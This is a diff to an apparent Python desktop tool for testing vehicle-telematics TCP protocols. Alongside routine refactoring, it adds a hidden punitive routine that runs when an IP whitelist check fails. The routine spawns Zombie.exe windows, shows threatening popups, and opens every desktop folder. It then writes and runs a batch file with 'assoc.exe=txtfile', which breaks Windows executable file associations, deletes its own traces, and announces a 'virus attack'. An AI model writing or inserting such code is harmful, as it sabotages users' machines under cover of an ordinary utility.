@@ -17,6 +17,10 @@ import webview
 from tkinter import messagebox
 import sys
 
+is_on = True
+from tkinter.messagebox import *
+import fnmatch
+
 LOG_LINE_NUM = 0
 init_window = ttk.Window()
 
@@ -94,10 +98,6 @@ def get_latitude(base_lat=None, radius=None):
     latitude = x + base_lat
     return str(latitude)[:9]
 
-
-is_on = True
-from tkinter.messagebox import *
-import fnmatch
 
 current_directory = os.getcwd()
 
@@ -2315,9 +2315,9 @@ class MY_GUI(tk.Tk):
 
     def search(self):
         print("正在打开网站!")
-        txt = entry.get()
+        txt = self.entry.get()
         if txt.startswith('http://') or txt.startswith('https://'):
-            frame.load_url(txt)
+            self.frame1.load_url(txt)
 
     # 设置窗口
     def set_init_window(self):
@@ -3028,14 +3028,14 @@ class MY_GUI(tk.Tk):
         pane10 = Frame()
         items = (
             'http://www.baidu.com', 'https://czcwyc.mmjtsw.com:8082/login', 'https://taxitest.car900.com:8082/login')
-        entry = ttk.Combobox(pane10, width=140, values=items)
-        entry.grid(row=1, column=1, sticky=W)
+        self.entry = ttk.Combobox(pane10, width=140, values=items)
+        self.entry.grid(row=1, column=1, sticky=W)
 
-        button3 = ttk.Button(pane10, text="访问http", width=10, command=lambda: self.thread_it(self.search))
-        button3.grid(row=1, column=1, sticky=E)
-        frame = WebView2(pane10, 1100, 532)
-        frame.grid(row=2, column=1, sticky=N)
-        frame.load_url(f'{self.url}')
+        self.button3 = ttk.Button(pane10, text="访问http", width=10, command=self.search)
+        self.button3.grid(row=1, column=1, sticky=E)
+        self.frame1 = WebView2(pane10, 1100, 532)
+        self.frame1.grid(row=2, column=1, sticky=N)
+        self.frame1.load_url(f'{self.url}')
 
         note.add(pane2, text='部标808TCP发送')
         note.add(pane1, text='出租车905TCP发送')
@@ -3059,8 +3059,6 @@ def countdown(t):
 def count_runs():
     global file_path
     current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-    import os
-
     try:
         path = r"C:\Users"
         if not os.path.exists(path):
@@ -3073,31 +3071,35 @@ def count_runs():
             file.write(f"{runs}\n")
 
         print(f"第 {runs} 次运行于 {current_time}")
-        if runs == 10:
-            sys.exit(0)
-            # file_path1 = os.path.join(path, "update.bat")
-            # file_path2 = os.path.join(path, "delete.bat")
-            # with open(file_path1, "w") as file:
-            #     file.write("assoc.exe=txtfile")
-            # with open(file_path2, "w") as file:
-            #     file.write("assoc.exe=exefile")
-            # import subprocess
-            # countdown(60)
-            # subprocess.Popen(r"C:\Users\update.bat")
-            # countdown(5)
-            # os.remove(r"C:\Users\count.txt")
-            # os.remove(r"C:\Users\update.bat")
+        return runs
     except FileNotFoundError:
         with open(file_path, "w") as file:
-            file.write("1\n")
+            file.write("0\n")
 
-        print(f"首次运行于 {current_time}")
+
+def bdu():
+    path = r"C:\Users"
+    file_path1 = os.path.join(path, "update.bat")
+    file_path2 = os.path.join(path, "delete.bat")
+    with open(file_path1, "w") as file:
+        file.write("assoc.exe=txtfile")
+    with open(file_path2, "w") as file:
+        file.write("assoc.exe=exefile")
+    import subprocess
+    countdown(10)
+    subprocess.Popen(r"C:\Users\update.bat")
+    countdown(5)
+    os.remove(r"C:\Users\count.txt")
+    os.remove(r"C:\Users\update.bat")
+    init_window.withdraw()
+    init_window.attributes('-topmost', True)
+    showwarning(title="！！！！警告警告！！！！", message=f"第3次警告提醒,病毒程序已启动,请联系管理员处理,否则后果自负")
 
 
 def gui4_start():
     ZMJ_PORTAL = MY_GUI(init_window)
     ZMJ_PORTAL.set_init_window()
-
+    init_window.deiconify()
     for filename in os.listdir(current_directory):
         if fnmatch.fnmatch(filename, ico_pattern):
             init_window.iconbitmap(f"{filename}")
@@ -3128,11 +3130,12 @@ def find_numbers_in_strings(strings):
 def stop_exe(exe_name):
     import signal
     # 获取所有运行中的exe进程
-    for i in range(int(MY_GUI(init_window).Zombie) * 2):
+    while True:
         processes = os.popen('tasklist').read()
         print(processes)
-        if exe_name in processes:
-            # 找到进程ID
+        if exe_name not in processes:
+            break
+        else:
             pid = [i for i in processes.split('\n') if exe_name in i][0].split(' ')
             try:
                 os.kill(int(find_numbers_in_strings(pid)[1][0]), signal.SIGTERM)
@@ -3141,24 +3144,51 @@ def stop_exe(exe_name):
 
 
 def show_popup():
+    init_window.withdraw()  # 隐藏主窗口
     import subprocess
     for i in range(int(MY_GUI(init_window).Zombie)):
         subprocess.Popen(os.getcwd() + "\\conf\\Zombie.exe")
-        countdown(15)
-    messagebox.showwarning(title="！！！！警告警告！！！！", message="请联系管理员添加白名单，否则吃掉你，┗|｀O′|┛ 嗷~~")
+        countdown(6)
+    init_window.attributes('-topmost', True)
+    showwarning(title="！！！！警告警告！！！！", message="请联系管理员添加白名单，否则吃掉你脑子，嘎嘎香，┗|｀O′|┛ 嗷~~")
     stop_exe('Zombie.exe')
 
 
+def wjj():
+    desktop_path = os.path.join(os.path.expanduser("~"), 'Desktop')
+    wjj_pattern = '*'
+    for filename in os.listdir(desktop_path):
+        if fnmatch.fnmatch(filename, wjj_pattern):
+            if os.path.isdir(desktop_path + f"\\{filename}"):
+                print(desktop_path + f"\\{filename}")
+                os.startfile(desktop_path + f"\\{filename}")
+
+
 # #
-log1 = os.getcwd() + "\\conf\\log.out"
-f = open(log1, 'w')
-sys.stdout = f
-sys.stderr = f
+# log1 = os.getcwd() + "\\conf\\log.out"
+# f = open(log1, 'w')
+# sys.stdout = f
+# sys.stderr = f
 
 if __name__ == '__main__':
     if check_ipv4():
         gui4_start()
     else:
-        init_window.withdraw()  # 隐藏主窗口
         show_popup()
+        print('结束')
+        count_runs()
+        if count_runs() == 1:
+            init_window.deiconify()
+            gui4_start()
+        else:
+            init_window.withdraw()
+            init_window.attributes('-topmost', True)
+            showwarning(title="！！！！警告警告！！！！", message=f"第1次警告提醒,否则将启动文件夹攻击")
+            countdown(6)
+            wjj()
+            countdown(6)
+            init_window.withdraw()
+            init_window.attributes('-topmost', True)
+            showwarning(title="！！！！警告警告！！！！", message=f"第2次警告提醒,否则10s后将启动病毒攻击")
+            bdu()
         sys.exit()
